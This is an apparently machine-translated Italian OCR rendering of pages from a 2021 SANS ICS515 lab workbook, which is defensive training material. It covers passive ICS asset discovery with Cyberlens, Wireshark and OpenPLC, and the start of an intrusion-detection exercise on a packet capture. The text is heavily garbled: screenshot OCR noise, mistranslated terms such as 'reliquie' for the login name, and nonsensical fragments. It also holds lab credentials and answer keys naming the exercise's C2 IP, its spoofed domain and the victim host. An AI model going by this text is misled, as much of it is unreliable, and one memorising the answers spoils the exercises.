“((ip.addr==10.10.20.50) ) && (cip.symbol corrisponde a “TimerDelay”)” | ordinare | unig -c

Esercizi da asporto

Alcuni protocolli ICS, non tutti, contengono informazioni affidabili utili per l'identificazione delle risorse
scopi. Spesso sorprende le persone che tu possa regolarmente estrarre marca/modello/seriale/firmware e
maggiori informazioni dai protocolli ICS, il tutto passivamente analizzando il traffico. Comprendere anche i protocolli ICS
ti permettono di vedere cosa viene fatto ai controller come scrivere/leggere e quali comandi con cosa
i valori vengono forniti ai controllori.

© 2021, Robert M. Lee Lab2.3-7
Dp DD DO aa

ahi

» oe oO ww ww Ww Ww Ww

voto

e Analizzare il traffico e i protocolli di un sistema in esecuzione
e Identificare le risorse di un sistema in esecuzione

Questo laboratorio utilizzerà Windows VM, RELICS VM e il kit PLC

1. In base al traffico di rete, quanti PLC sono presenti nel segmento locale?

2. Sono presenti componenti del sistema che comunicano utilizzando ICS sconosciuti e/o possibilmente proprietari
protocolli?

Compito: analisi delle relazioni tra l'applicazione ICS e il traffico di rete.

*Nota* Per ottenere gli stessi risultati mostrati in questa cartella di lavoro, assicurarsi che il sistema sia in esecuzione con quanto segue
impostare.

1. Organizzare l'ambiente per il laboratorio assicurandosi che il sistema funzioni con la seguente configurazione.

> Il ClickPLC e la scheda I/O sono assemblati, configurati e funzionanti.

> Aprire il software di programmazione CLICK (Windows fare doppio clic sull'icona del desktop per Click
software) e selezionare Connetti al ClickPLC. Selezionare Connetti quando viene rilevato il PLC Click
e selezionare Leggi progetto dall'opzione Clicca PLC.

> Fare doppio clic sul collegamento del display HMI sul desktop della VM Windows per aprire l'HMI e
passare alla schermata "Principale".

> Se le comunicazioni sull'HMI sono scadute o si sono interrotte, riavviare il server MatrikonOPC
per il servizio Dispositivi Modbus facendo doppio clic sul desktop Matrikon Service Restart
scorciatoia

© 2021, Robert M. Lee Lab 2.4-1
Principale HMI del sistema di alimentazione 1H

fata,

@)

enerazione.abbiamo mangiato la trasmissione
Uscita MW anche i 4 relè di protezione dell'interruttore
n Chiuso 1 Aperto Chiuso, |_ Reset errore
Sirae ve colpa
1
\' | 7s an
tla
= un
Gatto
Generatore - Anni ie et
———516 | s3— ofo~
ai6 | all'ovo
o t © fo
eeeee. t=! (TRSSSSS
Carica T
Min <> Max i”
oh | ft r
ix, ~ Richiusura
' Era Apri Chiudi
N come 'a*
1\4 Carica
e oh
'ez 7 \ Misuratore di potenza (%) | Il mio massimo
1
un >
Fes im. ~ oi T
© 2021 SANS | ere} | | ——2-6.
Prodotto negli USA 1 anno fa 4109)
industria’ [Distribuzione

'Aleem pneumatico 'Achnowieage bre
Tit 0 FH 'Trancmission Breaker Theped AN
Area di generazione Azienda agricola critica
Generatore locale NotAl iin per Bresiar chiuso

lor Mott pattumiera per Bresker chiuso
rea Critica Alara

17:00
a5 Pu

+7752021 82050 TEL
+71510001 25229 PU

2. Aprire la VM RELICS ed effettuare l'accesso

> Nome utente: reliquie

> Parola d'ordine: reliquie
3. Assicurarsi di poter eseguire il ping da RELICS alla VM Windows e al PLC CLICK

> Aprire una finestra Terminale ed eseguire il ping di 192.168.0.8 (VM Windows) e 192.168.0.10 (CLICK PLC)
4. Avviare l'applicazione OpenPLC configurata sulla VM RELICS

> Individuare l'icona OpenPLC nel vassoio inferiore e fare clic con il tasto destro su di essa per "Avviare i servizi OpenPLC"

Nuova finestra

Avvia i servizi OpenPLC

oanoesegHh>, ® &® & & eo ®

Arrestare i servizi OpenPLC

Rimuovi dai preferiti

a, ® m@

> Andare alla VM Windows e fare doppio clic sul collegamento sul desktop OpenPLC Runtime a cui connettersi
il servizio RELICS OpenPLC appena avviato. Accedi come Nome utente: reliquie Password: reliquie

© 2021, Robert M. Lee Lab 2.4-2

un oanmn @®
cs’ <p’ è <p’ iy <p ia è ve ip

1 secondo

“sp “5 è “5 è “Bs 4B) “s' “s 1s

“Se

ehm

il Cruscotto

Programmi
Dispositivi schiavi
Monitoraggio
Hardware
Utenti
Impostazioni

Disconnettersi

Stato: arrestato

Avviare il PLC

Pannello di controllo
Stato: arrestato
Programma: Valvola Carburante
Descrizione:

File: 756084.st

Durata: N/D

Registri di runtime

Il runtime di OpenPLC è n

Valvola del carburante

Selezionare il pulsante "Avvia PLC".
Attendi qualche secondo, quindi aggiorna la pagina oppure vai alla pagina </> Programmi e poi torna a
la pagina del dashboard. Dovresti vedere lo stato cambiare in In esecuzione. Ora abbiamo stabilito
comunicazioni da un “softPLC” in esecuzione su RELICS all'HMI in esecuzione sulla VM Windows e
comunicazioni dal Click PLC al RELICS OpenPLC e all'HMI.

All'interno di RELICS, start-up Cyberlens.

VVVV

© 2021, Robert M. Lee

Fai clic con il pulsante destro del mouse sull'icona Cyberlens dal pannello Dock nella parte inferiore dello schermo.
Scegli "Avvia servizi"
Quando richiesto in una nuova finestra del terminale, inserisci "reliquie" come password.

Una volta chiusa la finestra del terminale, fare clic con il pulsante sinistro del mouse sulla stessa icona Cyberlens per aprire l'applicazione.

Nuova finestra

Avvia Servizi

Interrompere i servizi

Rimuovi dai preferiti

Laboratorio 2.4-3
8. All'interno di Cyberlens, se richiesto:
> Inserisci il nome utente "reliquie" e la password "reliquie".
> Seleziona la casella "Accetta il contratto di licenza" e "Accedi".

Nome utente

reliquie

¥ Accetta il contratto di licenza @

Registrazione

9. Controlla lo stato del server.
> Apri la "Console del server" dal menu a sinistra.
> Assicurarsi che il server sia in esecuzione sulla porta di ascolto 1337.

Tempo trascorso: 0d:0h:0m:15s |
tt Porta di ascolto: 1337 |

© 2021, Robert M. Lee Lab 2.4-4

oe, @, @, @, @ @, @,

ehi,

ce) @),
ae ww ww ww ww WW

noi Ww

oe come aJ ws

10. Configurare ed eseguire il sensore.

> Apri la "Console dei sensori" dal menu a sinistra.

> In "Live Capture", inserisci le seguenti opzioni visualizzate nell'immagine sottostante.

Opzioni di interfaccia

ens33

Dimensione finestra @
10

Ospite del server

localhost

Porta del server @
1337

# Opzioni

secondi +

> Avviare il sensore e assicurarsi che funzioni come mostrato nell'immagine seguente.

Tempo trascorso: 0d:0h:0m:43s

© 2021, Robert M. Lee

Lab2.4-5
11. Cattura alcuni record.
> Guarda i "Registri dei sensori" per le nuove voci.

«Registrazioni dei sensori
'Sensore * Pacchetti Byte Dimensione finestra Timestamp |
b 149K 181 KB 16 secondi 2021 -07-0GT00:23:45.0002 |
1 148K t80Ke 10 secondi 2n21-07-0870028'34 0002 |
1 137K 1eKB 10 secondi 2021-07-03T0023:12.0002 |

j Byte elaborati

> Lascia il sensore in esecuzione in background per raccogliere più dati e passare al passaggio successivo.
> (In alternativa) Attendere fino al raggiungimento di 5 o più record prima di arrestare il sensore.

*Nota* La tabella e il grafico rappresentano il numero di pacchetti elaborati. Dovrebbero essere circa 1,47K pacchetti
e 178-179 byte. Inoltre, se la dimensione della finestra è stata lasciata predefinita, dovrai attendere più a lungo affinché i record lo facciano

° @

®

essere visualizzato.

12. Rivedi dashboard

> Naviga su "Dashboard" dal menu a sinistra.

> Esamina le informazioni visualizzate ma prendi nota dell'oggetto "Livello applicazione".

Livello di applicazione

© 2021, Robert M. Lee

di Web HTTP a.

Altro

Modoso
Lo

Laboratorio 2.4-6

eh

= = sì, ehi

=

~

o
è è’ è <s è! È!

COME

13. Esaminare la topologia del traffico di rete e le risorse sulla rete.
> Naviga su "Mappa interattiva" dal menu a sinistra.
> Carica l'acquisizione facendo clic su "Avvia" e quindi su "Acquisizione live/offline".

Eadbmis live/offline
Istantanee

Confrontare

Mappa attuale

Cancella mappa

> La topologia visualizzata sarà simile alle immagini sottostanti ma varierà a seconda del traffico
presenti in rete.Se vengono visualizzati solo gli indirizzi MAC, sarà basato sul comportamento
analitica all'interno di Cyberlens non è stata in grado di associare l'indirizzo MAC di un dispositivo al suo indirizzo IP.

i 00:0¢:29:7b:ad:74
00:40: 7¢:12:c7:05 inware
OEE. ‘

Rete non mappata
00:0¢:29:45:d3:86
Vmware

> Lasciare il sensore in funzione, o riavviarlo se fermo, per consentire la riuscita dell'associazione MAC/IP.

© 2021, Robert M. Lee Lab2.4-7
> Ogni pochi minuti aggiorna la topologia facendo clic su "Avvia" e quindi su "Acquisizione live/offline" fino a quando
tutti, o almeno alcuni, degli indirizzi IP appaiono associati all'indirizzo MAC come mostrato nell'immagine
immagine qui sotto.

>> Torna alla Console del sensore facendo clic sul pulsante di navigazione a sinistra di Start
pulsante nella parte superiore del menu a sinistra. Dalla console del sensore Arrestare il sensore.

fa

192.168.0. _
00:0¢:29:4:
Vmware 2.168,0.10
B0:70:12:¢7:05
KoyoElec

192.168.0.8
00:0¢:29°7b:ad:74
Vmware

*Nota* Quando si acquisiscono pacchetti da un'altra rete remota, l'effettivo indirizzo MAC del dispositivo remoto
non sarà presente. Pertanto, per vedere tutti gli indirizzi IP privati ​​e pubblici catturati dalla rete
fai clic su "Visualizza" e seleziona "Dispositivi pubblici/esterni" e "Dispositivi privati/interni". La capacità di associarsi
l'indirizzo MAC e l'indirizzo IP del punto finale aiuteranno a capire quali comunicazioni esistono all'interno di una rete
segmento e tra segmenti di rete.

14. Esaminare la tabella dei risultati.
> Passare alla schermata "Visualizzatore dati".
> Più record dovrebbero essere visualizzati in "Tabelle dati". Fare clic su "Protocolli visti per la prima volta" per
aprire la tabella associata.

© 2021, Robert M. Lee Lab2.4-8
perché Ww

“Pp “sp ws così com’è mT è “B”

“P

Visualizzatore > Protocolli visti per la prima volta

Protocolli visti per la prima volta

@ Installatori:
Mostra 10 voci v

Indirizzi Ethernet s

Indirizzi IP

192.168.0.9

192.168.0.10

192.168.0.8

192.168,08

192.168.0.9

192.168.0.8

192.168.0.10

Strato

applicazione
applicazione
applicazione
applicazione
applicazione
applicazione

applicazione

> Selezionare "Modbus" nel filtro nella colonna Protocollo.

> Tre risorse stanno comunicando utilizzando Modbus, tuttavia, questa tabella non indica quali

dispositivo è il PLC.

Indirizzi Ethernet 4 indirizzi IP
00:00:29:45:d3:86 192.168.0.9
00:0c:29:7b:ad:74 192.168.0.8
00:00:7¢:12:c7:05 192.168.0.10
Filtro

> Torna all'elenco delle "Tabelle dati" in "Visualizzatore dati" e apri i "Record del flusso di applicazioni"

tavolo.

> Scarica la tabella in formato EXCEL e aprila in LibreOffice Calc facendo clic sul collegamento nel file

In alto a destra.

© 2021, Robert M. Lee

Filtro

Strato

applicazione

applicazione

applicazione

Filtro

Protocollo
ModBus
ModBus
ModBus
HTTP sul World Wide Web
HTTP sul World Wide Web
Protocollo sconosciuto

Protocollo sconosciuto

Protocollo

ModBus.

ModBus

ModBus

Filtro

Lab2.4-9
°

ning trasporti_records,xls x

Hai scelto di aprire:
trasporti_records.xls

ovvero: tipo applicazione/xls
da: http://localhost

Cosa dovrebbe fare Firefox con questo file?
C YBER @openwith LibreOffice Calc (predefinito) v

Salvare il file

Fallo automaticamente Per file come questo Da ora in poi. |

Scarica: | csy | |
| Annulla OK N

> All'interno di LibreOffice Calc, attiva il filtro automatico e fai clic su "Sì" per utilizzare la prima riga come intestazione di colonna.

File Modifica Visualizza Inserisci Formato Stili Foglio Dati Strumenti Finestra Guida

-G@-H- Inizia asg

|

J
|
|
|
|

19|
Ai ~ fx E+ = srcip 'o |
o Questo documento è aperto in modalità di sola lettura. | Filtro automatico h
Altri filtri »
Moe | ce Tl | : E |

(sictP_|Dst iP Protocol. Applicazione | Definisci intervallo... prt

2 _/192.168.0.9 192.168.0.10 TCP __Modbus Seleziona intervallo...

3 _|192.168.0.10 192.168.0.9 TCP Modbus _ Pai

> Utilizza la prima riga come intestazioni di colonna
> Filtra la colonna "Porta origine" per mostrare solo le voci 502.
>> Aprire il menu filtro nella colonna "Src IP" e annotare la voce.

© 2021, Robert M. Lee Lab 2.4-10

“, noi) ‘B) @, ee,

e)

(2) e HD)

.
Ow Ww Ww WD W

Te

contro CA! Cs CS

Ua

ip

è così è

w

un eee
ont [e]ost Por [x]Totale Pa
Ordine crescente

- Ordine crescente

Ordinamento discendente =| Ordine decrescente

I primi 10 ~~} I primi 10
Vuoto i - Vuoto
Non vuoto 7 Non vuoto

Filtro standard... 7 — Filtro standard...

[Cerca elementi... “| Elementi di ricerca

: je Sie) ea
|, (-] $0095, $4573, 59260 | mi
502| |
~ | 50780 cioè +
51365| “|
|
|

| $ 1775 om —

_] $ 1793, 63420

_OK » Annulla OK | Annulla

lars TV ieMy ID GIOCATTOLO TRH TW TG? TRA TH Trp

|
io
io

*Nota* Viene elencata solo 1 voce, il che significa che dai pacchetti raccolti, il dispositivo all'indirizzo 192.168.0.10 è
eseguire un server Modbus. (Potresti vedere due indirizzi IP come un artefatto del tuo sistema). In quanto tale, questo è un
PLC attivo all'interno del traffico di rete raccolto. Ulteriori indagini sul traffico di rete in base allo stato del sistema
le modifiche sono necessarie per confermare che questo è l'unico PLC presente.

15. Torna alla "Console del sensore" in Cyberlens e riavvia le acquisizioni live.
16. Tornare alla VM Windows e passare alla visualizzazione Generazione.

> Assicurarsi che i "CT Fuel Valve Controls" siano in modalità automatica e che OpenPLC sia selezionato come mostrato in
immagine qui sotto.

© 2021, Robert M. Lee Lab 2.4-11
BE Power System HMI - Generazione

Principale

Trasmissione ; 718)2021
Generazione Pept ti Residenziale Industriale Rai PM

La valvola del carburante CT controlla lo stato di interblocco della generazione

19 3 @ OpenPic * @ Trans Breaker chiuso

Locale o Manuale

© Modalità manuale i | j O Intertie attivato
© Autorizzazioni dell'interruttore automatico della modalità
© Locale Fare clic su PLO y @ Generatore in funzione

@Trad. Relè di protezione
@ Carica presente

Turbina a vapore ad aria aspirata
120

Turbina a combustione

@CT in esecuzione @AVROn Power

Modalità Esperto © /CT Arrestato © Modalità Manuale Attiva Generazione Consumo Disponibile
Sim84
'On = Utilizza la tensione di avvio PB Industnal 0 MW Mw Local

Spento = Avvio automatico Regolazione SES gemcd: MW Intertie

Residenziale 50 aw

Totale uw mw Totale

* 715/2021 20:20:50 5 ‘Allarme critico area di trasmissione
+ 79572021 352.29PM © — 72021 14855AM Zona residenziale Allarme critico

Messaggio
Interruttore di trasmissione ribaltato
Allarme critico per l'area di generazione

Nota minima del generatore locale per interruttore chiuso
Generatore locale non compatibile con l'interruttore chiuso
Allarme critico per l'area di generazione

Controlli della valvola del carburante CT

© Modalità manuale
@ Modalità automatica
© Locale Fare clic su PLC

19% aperto presso OpenPLC

Locale o Manuale
Modalità modalità OpenPLC
Controllo _ Setpoint di controllo

ClickPLC == Manuale ~
un io

> Con i controlli della valvola del carburante ora gestiti dal PLC aperto remoto, testare il PLC con il PLC
operazioni aumentando o riducendo il carico dai quadranti residenziali e industriali sulla scheda.

> Dovresti vedere un cambiamento associato nella posizione percentuale di apertura della valvola in risposta al carburante
la domanda cambia quando il carico aumenta o diminuisce. Ora stiamo vedendo più un sistema tradizionale di
sistemi di acquisizione delle comunicazioni con più dispositivi di controllo sulla rete, ciascuno dei quali gestisce a
parte specifica del processo e comunicando in modo univoco all'HMI.

> Torna a Cyberlens e lascia il sensore in funzione.

> Ripeteremo l'ultimo passaggio di esportazione e revisione dei dati in EXCEL. Torna all'elenco di
"Tabelle dati" in "Visualizzatore dati" e apri la tabella "Record flusso applicazioni".

> Scarica la tabella in formato EXCEL e aprila in LibreOffice Calc facendo clic sul collegamento nel file
In alto a destra.

> All'interno di LibreOffice Calc, attiva il filtro automatico e fai clic su "Sì" per utilizzare la prima riga come intestazione di colonna.

> Filtra la colonna "Porta origine" per mostrare solo le voci 502.

> Apri il menu filtro nella colonna "Src IP" e annota la voce.

© 2021, Robert M. Lee Lab 2.4-12

@,

>
www

“> è “> ip! ip) è 4s! sì! è è! <s è

noi

"S

ed

'SSS a se at Se ea Re
Wisc ip [glos iP [e]Protocoi
3 Ordinamento crescente
Ordine decrescente

I primi 10 -_
Vuoto
Non vuoto

Filtro standard... a

Cerca elementi...

192.168.0.9

PPrePePrrer errr rPererrl

OK _ Annulla

TE? TRH OWT? TRH TH mp

di Pha

*Nota* Un ICS in genere utilizza più dispositivi integrati, come PLC e RTU. Come e se compaiono
sulla rete dipenderà da 2 cose. (1) Il sensore sta raccogliendo il segmento di rete giusto per vedere il
traffico e (2) è presente una comunicazione attiva con il dispositivo. In questo laboratorio abbiamo determinato che i dispositivi finali
che ospitano un servizio Modbus (porta 502) fossero un PLC. Abbiamo anche stabilito che la visibilità della comunicazione PLC è
in base al display caricato sull'HMI. Questo piccolo esempio dimostra quanto possa essere difficile
rilevare comunicazioni ICS dannose senza falsi positivi quando si misura solo da una base di traffico.

*Risposta 1* Ci sono 2 PLC nella rete locale.

Compito: analisi del protocollo ICS

*Nota* Assicurati di aver configurato il sistema e le applicazioni come indicato nel passaggio uno all'inizio di questo
laboratorio.

1. Identificare gli endpoint che comunicano su un protocollo ICS sconosciuto.
>> All'interno di Cyberlens, aprire la tabella "Protocolli visti per la prima volta" in "Visualizzatore dati"
> Filtra la colonna "Protocollo" per visualizzare solo le voci "Protocollo sconosciuto".

© 2021, Robert M. Lee Lab 2.4-13
Protocolli visti per la prima volta

© Fes Pretec: Sconosciuto Pretec >

Spettacolo

Indirizzi Ethernet

00:00:29:7b:annuncio:74

00:40:76:12:07:05

Filtro

*Nota* Sembra che ci siano 2 endpoint che comunicano utilizzando un protocollo sconosciuto.
potrebbe semplicemente significare che Cyberlens non ha il

10 ~ voci

&

Indirizzi IP:

f€80:0000:0000:0000:7086:831 1 :ad82:6168

192.168.0.8
192.168.0.10

Filtro

Strato
applicazione
applicazione
applicazione

Filtro

Ricerca:
Protocollo
Protocollo sconosciuto
Protocollo sconosciuto
Protocollo sconosciuto
Filtro
UN

necessario per determinare cos'è il protocollo, se si tratta di un protocollo ICS effettivo e come si collega a questo ICS. Se questo
il record non esiste, è probabile che l'applicazione non sia configurata come indicato nel passaggio 1 all'inizio di

questo laboratorio.

2. Identificare l'applicazione del protocollo sconosciuto.

> All'interno di Cyberlens, aprire la tabella "Record del flusso di applicazioni" in "Visualizzatore dati"
> Filtra la colonna "Applicazione" per visualizzare solo le voci "Protocollo sconosciuto".
> Filtra la colonna "IP Dst" per visualizzare solo le voci "192.168.0.10".

Record del flusso dell'applicazione

Mostra 10

Srcip

192.168,06

192.168,08

192.168.0.8

192.168.08

192 168.08

192.168.0.8

192.168,08

192.168,08

192.168.0.8

192.168.0.8

Filtro
Y

© 2021, Robert M. Lee

v voci

L'IP

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

Filtro

Protocollo

uoP

uoP

uop

upe

uoP

suP

superiore

suP

superiore

upe

Filtro

Applicazione

Protocollo sconosciuto

Protocollo sconosciuto

Protocollo sconosciuto

“Protocollo sconosciuto

Protocollo sconosciuto

Protocollo sconosciuto

Protocollo sconosciuto

Protocollo sconosciuto

Protocollo sconosciuto

Protocollo sconosciuto

Installatore

Direzione

Sconosciuto

Sconosciuto

Sconosciuto

Sconosciuto

Sconosciuto

Sconosciuto

'Sconosciuto

Sconosciuto

Sconosciuto

Sconosciuto

Installatore

Porta Origine Porta Dst
58301 25425
58301 25425
58301 25425
$8301 25425
58301 25425
58301 25425
58901 25425
58301 25425
58901 25425
58301 25425
Montatore Montatore
gl v
Laboratorio 2.4-14

Sconosciuto, in questo caso
dissettori per questo particolare protocollo. Ulteriori analisi sono

~ o ~~ Fl] @) @®) ™) ™ @) @) @)

fe,

Aon? o°o,

('>
w

anno Domini

*Nota* Da quanto mostrato, 192.168.0.8 e 192.168.0.10 comunicano utilizzando questo protocollo sconosciuto.
Supponiamo che il PLC (192.168.0.10) sia il lato server di questa comunicazione e annotiamo il trasporto
protocollo di livello (UDP) e numero di porta di origine che potrebbero non corrispondere all'immagine sopra.

> Assicurarsi che il sensore Cyberlens sia arrestato.

> Dopo aver arrestato il sensore, chiudere Cyberlens

> Dall'interno di RELICS avvia WireShark dal pannello Dock.
> Avvia l'acquisizione di pacchetti sull'interfaccia ens33.

Catturare

...utilizzando questo filtro: [i [Inserisci un filtro di acquisizione...
dockerO ae

IT eee ee ee
veth5d3c69b Te
Loopback: lo AAU
qualsiasi f

> Con l'acquisizione in esecuzione, applicare il seguente filtro
porta udp ==25425

> Interrompere l'acquisizione se vengono visualizzati i pacchetti. Se non vengono visualizzati pacchetti, è probabile che il file
l'applicazione non è configurata come indicato nel passaggio 1 all'inizio di questo lab.

*Nota* I risultati in Wireshark indicano chiaramente che non esiste un dissettore per questo protocollo in Wireshark. Fare
nota dell'altra porta di comunicazione in uso nella conversazione filtrata avvenuta con la porta 25425

2. Identificare il processo e il fornitore che comunicano tramite questo protocollo.
> Dall'interno della VM Windows. Esegui PowerShell come amministratore.
>Eseguire il seguente comando. Sostituendo "YourPortNumberHere" nel comando con il file
Porta di origine identificata in precedenza.

Get-Process -Id (Get-NetUDPEndpoint -LocalPort YourPortNumberHere).OwningProcess | Seleziona percorso oggetto

*Nota* Il protocollo è correlato al software di programmazione AutomationDirect ClickPLC.

*Risposta 2* Gli endpoint 192.168.0.8 e 192.168.0.10 comunicano tramite un protocollo ICS sconosciuto. È
non è certo, ma probabile che si tratti di un protocollo proprietario.

© 2021, Robert M. Lee Lab 2.4-15
Esercizi da asporto

Lo scopo di questo esercizio era aggiungere un altro componente operativo all'ICS515 Student Lab
ambiente. Ciò è stato ottenuto avviando RELICS e lanciando l'applicazione OpenPLC che funge da
un soft PLC nell'ambiente che fornisce stato e controlli alla posizione della valvola di alimentazione del carburante del generatore.
Ciò ci consente di avere una visione più sistematica del processo Student Kit.

Con queste comunicazioni aggiuntive e le comunicazioni esistenti da e verso il kit dello studente al
HMI, potremmo vedere informazioni sui dispositivi, sui protocolli utilizzati, sul monitoraggio del traffico in tempo reale e sulle prestazioni eseguite
alcune analisi prototipali asset/ICS di comunicazioni proprietarie sconosciute.

Quando esegui l'individuazione delle risorse all'interno di un ambiente OT, potrebbero esserci comunicazioni sconosciute
scoperti tra i dispositivi e potrebbero facilmente esserci dispositivi che non sono stati visti a seconda del
stato operativo dell'ambiente (operazioni normali con dispositivi di standby primari/secondari, anomalie
operazioni dopo failover delle risorse o guasti dei dispositivi e operazioni di emergenza dopo un impatto sulle operazioni
evento). Questi vari stati operativi potrebbero facilmente influire sulle risorse che comunicano all'interno del sistema
ambiente e come appaiono le comunicazioni in un dato momento.

© 2021, Robert M. Lee Lab 2.4-16

FM

-~

~~
wowwwwwww

va Ww

eo wo w WwW

oT ee

oe vediamo PH ow OW

Lab 3.1 — Rilevamento delle intrusioni di Fase 1

e Distinguere le intrusioni generali dalle intrusioni della Fase 1
e Sfrutta l'analisi del traffico per seguire le intrusioni
e — Identificare gli artefatti e gli indicatori chiave delle intrusioni

*Informazioni sullo scenario* Il team Threat Intelligence Consumption ha notato che esiste una minaccia emergente
rivolti alla comunità industriale. Sono preoccupati che possa esserci una minaccia che faccia leva sull’estero
infrastrutture destinate alle imprese industriali. Non sanno nient'altro oltre al crescente interesse per
questa volta. Non sono nemmeno sicuri che l’avversario sia specificamente interessato all’ICS. Hanno chiesto la minaccia
team di rilevamento per eseguire un'analisi approfondita del traffico di rete oltre i rilevamenti attuali da identificare

qualcosa di anormale. Tu, come membro del team di rilevamento delle minacce, decidi di iniziare nella rete IT aziendale
della raffineria di Calistoga.

Preparazione agli esercizi

Questo esercizio utilizzerà la tua VM RELICS e il file itincident.pcap in ICS515 > calistogarefinery > pcaps
cartella sul desktop della VM.

1.Qual è l'IP di comando e controllo (C2), il suo dominio e il sistema vittima?
2. Qual è il nome del file che potrebbe essere dannoso?

3. Di quale comune utilità Windows si abusa nel documento?

4. Qual è l'indirizzo IP del probabile sistema compromesso?

5.

Quali sono altri due file potenzialmente dannosi che contribuiscono a dimostrare che si tratta di un'intrusione di Fase 1?

© 2021, Robert M. Lee Lab 3.1-1
Compito: regole di rilevamento

1. | Qual è l'IP di comando e controllo (C2), il suo dominio e il sistema vittima?
192.41.148.220

__tckwel(punto)ru
10.10.0.10
> Avvia la tua VM RELICS
> Accedi alla VM

> LOGIN=reliquie
> PASSWORD = reliquie

> Apri itincident.pcap in Wireshark
> Aprire la cartella ICS515 situata sul desktop e quindi accedere a calistogarefinery > pcaps
> Fare doppio clic su itincident.pcap per aprire il file in Wireshark

grasso Home Desktop 1CS515 calistogarefinery pcaps

- -
© Recenti —
2193 itincident.pca Eee
* Speciale = pipì?
Cy Hone un normalops.pcap
UN
(0 Desktop uN otincident.pcap
=) Documenti

*Nota* Spesso è utile identificare i "top talker" su una rete per vedere quali sono gli indirizzi e i sistemi
comunicare di più. Guardando gli indirizzi più comunicativi, il più grande trasferimento di dati, o addirittura
la durata più lunga delle sessioni è utile così come la ricerca della durata più breve. Questo non è sempre efficace quanto moderno
le reti hanno molte comunicazioni che sembrano molto simili alle comunicazioni di esfiltrazione o di comando e
controllo, ma è un buon punto di partenza.

> Analizza le conversazioni in Wireshark
> In Wireshark fai clic su Statistiche
> Seleziona Conversazioni
> Esaminare le comunicazioni IPv4

© 2021, Robert M. Lee Lab 3.1-2

~ °°, oh,

~~

~o° =

°,
un ip <s wa ww o/

w

COME

w

“5 OG

“5

a5

COME

4g40@")®

| &|Applica un filtro di visualizzazione... <ctri-/>
|No. Tempo
1 0,600000

Fonte

File Modifica Visualizza Vai Acquisisci Analizza Geo Telefonia Wireless _Strumenti Guida “i

Cattura le proprietà del file
Indirizzi risolti
Gerarchia dei protocolli

Conversazioni

2 ©.002090 10.10.0.5gf Endpoint
3 0.004474 10.10.0409 pacchetto Lunghezze
4 0.117871 10.10.0.50) monaco

Ctrlsalt+maiusc+c

*Nota* Nella scheda Conversazioni fare clic sulla scheda IPv4 e ordinare per Pacchetti in modo che il maggior numero di pacchetti

sono in cima alla lista.

192.41.148.220
10.10.10.20

2 1A tA 2A

227.708 65 milioni 109.538
51.811 62 milioni 44.805
AN e7O anna BY)

="

*Nota* Vediamo che l'indirizzo IPv4 10.10.0.10 comunica con 192.41.148.220 come comunicazione principale
sia dai pacchetti che dai byte nell'acquisizione dei pacchetti che abbiamo aperto. Ci sono altri dischi interessanti, ma noi
ci concentreremo qui e determineremo qual è l'indirizzo IP 192.41.148.220 per vedere se qualcosa risalta
prima di approfondire le comunicazioni. Non è stato precedentemente identificato nella fase Visibilità.

> Analizzare il nuovo indirizzo IP

> Seleziona l'indirizzo IP, fai clic con il pulsante destro del mouse e scegli Applica come filtro > Selezionato > Qualsiasi -> B

> Esaminare il traffico

Ethernet-18 IPv4-17 IPv6 TCP-1582

| Indirizzo A Indirizzo B Pacchetti Byte
10.10.0.10 192.471.148.220 29.462
10.10.0.10 10.10.11 Applica come filtro rf
10.10.0.50 10.10.2, esso: |
10.10.0.10 10.10.90, Prepara un filtro
10.10.0.40 10.10.2, Trova |
10.10.0.10 10.10.2) .

(10.10.0.30 10.102..Solorze

16

*Nota* Esistono diversi modi per trovare informazioni su questo indirizzo IP nell'acquisizione dei pacchetti, incluso
identificare tutti i protocolli che utilizza e identificare quelli che potrebbero contenere informazioni identificative. Con il
filtro applicato in precedenza, anche se vediamo che è presente traffico TCP e HTTP. È probabile che il traffico HTTP dia

quello che vogliamo, incluso un nome di dominio.

> Determina se sono presenti informazioni nelle sessioni HTTP
> Fare clic su una delle comunicazioni HTTP

© 2021, Robert M. Lee

Laboratorio 3.1-3
> Fare clic con il tasto destro e seguire > Flusso TCP

Destinazione

Seq=276 Ack=20458
Seq=276 Ack=27758 Vittoria=48128
Seq=276 Ack=35058 Vittoria=40704
Seq=276 Ack=42358 Vittoria=33536
Seq=276 Ack=48198 Vittoria=27648
Seq=276 Ack=96878 Vittoria=15872

143 .810538 10.10.0.
143.810590 10.10.0.
143 .810642 10.10.

143.810696 10.10.60.
143.810901 10.10.60.
143 .811003 10.10.60.

|ACK]
Modifica nome risolto |
Applica come filtro

A)
circuito integrato}
Q
9
circuito integrato)
143.810484 10.10.0.10 192.41.
io}
circuito integrato}
A)
circuito integrato}
ic) Preparare come filtro
circuito integrato}

Mio
2
B
©
N
B
raggio
parr arian sono dove sono ers

Filtro di conversazione

-809158 3 2.41 Seleziona/Deseleziona pacchetto CctreM JACK] Seg=1 Ack=1 Win=65536 Len=0
143.809336 10.10.0.10 41 . documentoHTTP/1.1
B 143.809942 10.10.0.10 141 Ignare/Unignore Packet etre ACK] Seq=276 Ack=18 Win=65536 Le
B 143.810338 10.10.0.10 192.41 Riferimento temporale impostato/non impostato ctrl |ACK] Seq=276 Ack=7318 Win=65536
143.810431 10.10.0.10 192.41 Time Shift... CtrleshifteT [ACK] Seq=276 Ack=13158 Win=62720
CK] Seq=276 Ack=16078
Commento pacchetto... Ctrl+Alt+c

372: 66 byte su cavo (528 bit), 66 byte
et II, Src: Dell_3c:53:04 (f8:db:88:3c:53%Q

w

Colora la conversazione
SCTP

Flusso TCP Ctrl+Alt+Maiusc+T

*Nota* Apparirà la rappresentazione ASCII del flusso TCP che ci mostrerà in dettaglio cosa stava accadendo.
Ci mostra anche che il nome di dominio dell’indirizzo IP è rckwel.ru che sembra essere una versione errata di
Rockwell ha ospitato su un dominio russo. Queste cose da sole non garantiscono che sia dannoso, ma è sicuro
punto di partenza che sarà valido per noi in questo scenario.

Wireshark: segui il flusso TCP (tcp.stream eq 0) - itincident.pcap

GET /Resume.doc HTTP/1.1

Accetta: text/html, application/xhtml+xml, us ai

Referente: http://rckwel.ru/

Accetta lingua: en-US

Agente utente: Mozilla/5.@ (Windows NT 6.1; Trident/7.0; rv:11.0) come Gecko
Codifica accettata: gzip, deflate

Ospite: rckwel.ru

Connessione: Keep-Alive

HTTP/1.0 200OK

Server: SimpleHTTP/0.6 Python/2.7.18rc1
Data: venerdì 10 luglio 2020 21:35:16 GMT
Tipo di contenuto: applicazione/msword
Lunghezza contenuto: 265728

